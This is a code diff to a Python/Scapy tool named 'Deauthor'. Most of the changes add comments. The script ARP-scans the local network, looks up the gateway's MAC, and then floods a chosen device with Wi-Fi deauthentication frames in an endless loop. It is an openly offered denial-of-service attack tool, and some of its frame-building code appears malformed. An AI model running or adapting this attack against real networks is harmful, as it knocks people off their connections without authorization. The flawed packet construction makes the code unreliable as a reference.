@@ -8,11 +8,17 @@ import time
 
 global get_gateway
 
-def deauth():  # Deauth packets sent to the users nominated host.
+def deauth():  
     def mac_addr():
         global mac_address
+
+        # MAC address input to enter the MAC address of the users nominated choice. 
+        
         mac_address = input('ENTERMAC: ')
         def_len = 'ff:ff:ff:ff:ff:ff'
+
+        # error checking to ensure the MAC is correct syntactically and in line with RFC 7769
+        
         if mac_address == '':
             print('This field cannot be empty.')
             time.sleep(2)
@@ -24,6 +30,7 @@ def deauth():  # Deauth packets sent to the users nominated host.
             time.sleep(2)
             return deauth()
         
+    
     
     os.system('clear')
     menu_of_items_Deauth = input('''
@@ -37,36 +44,62 @@ def deauth():  # Deauth packets sent to the users nominated host.
 
     
     if menu_of_items_Deauth == '1':
+
+        # calls mac_addr() to enter the mac address for the attack 
+        
         mac_addr()
         print('MAC ADDRESS SET!')
         time.sleep(1)
+
+        # clears the terminal and returns deauth() to either go back or start the attack. 
+        
         os.system('clear')
         return deauth()
 
     elif menu_of_items_Deauth == '2':
+
+        # Gets the default gateway IP  
+        
         get_gateway = conf.route.route('0.0.0.0')[2]
+
+        # Returns the MAC by using ARP to retrieve the MAC using the IP. 
+        
         mac_gateway = getmacbyip(get_gateway)
         confirmation = input('y/n to confirm: ')
+
+        # starts the Deauthing attack against the MAC address. 
+        
         if confirmation == 'y':
             while True:
                 deauth_frame = RadioTap()/Ether(src=mac_gateway, dst=mac_address)/Dot11(subtype=12)
                 sendp(deauth_frame)
+
+        # else-IF the prompt is equal to n then just quit and return to the Deauth menu. 
+        
         elif confirmation == 'n':
             return deauth()
         else:
             return deauth()
+
+    # Return to the main menu    
+     
     elif menu_of_items_Deauth == '3':
         return menu()
 
+    # Return to
+    
     else:
         os.system('clear')
         return deauth()
         
     
 
-def get_local_devices(get_gateway):  # Sends ARP Request to discover hosts.
+def get_local_devices(get_gateway):  
     print('## Scanning network, hold Ctrl C to cancel. ##')
     print('')
+
+    # Scans the network using the broadcast MAC address as the destination and returns IPs associated with the MAC addresses 
+    
     ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=get_gateway), timeout=6)
     ans.summary(lambda s,r: r.sprintf("IP Address: %ARP.psrc% MAC Address: %Ether.src%"))
     time.sleep(2)
@@ -77,6 +110,8 @@ def get_local_devices(get_gateway):  # Sends ARP Request to discover hosts.
 Would you like to rescan? n to return to menu.
 
 y/n: ''')
+
+    # IF y then restart the process, ELSEIF n then return to main menu.
     
     if menu_return == 'n':
         print('')
@@ -84,21 +119,23 @@ y/n: ''')
         time.sleep(1)
         return menu()
     elif menu_return == 'y':
-        get_local_devices(get_gateway)
-    
-    
-    
+        get_local_devices(get_gateway)  
 
-def resolve_gateway():  # Resolves gateway IP
+def resolve_gateway():  
     global get_gateway
-    
+
+    # This function is called when the gateway IP requires resolving. 
+        
     os.system('clear')
     get_gateway = conf.route.route('0.0.0.0')[2]
     get_local_devices(get_gateway)
     map(deauth, get_gateway)
 
 
-def menu():  # Choose to scan or Deauth a Node. 
+def menu(): 
+
+    # Menu of items, the users begins here. 
+    
     os.system('clear')
     men_u = input('''
 | ## Deauthor | Made by StaleCrescent65 ##
@@ -108,6 +145,8 @@ def menu():  # Choose to scan or Deauth a Node.
 | 2) Deauth Attack 
 |
 |
+  
+  
   >> ''')
     
     if men_u == '1':
@@ -119,6 +158,3 @@ def menu():  # Choose to scan or Deauth a Node.
     
 
 menu()  
-
-
-
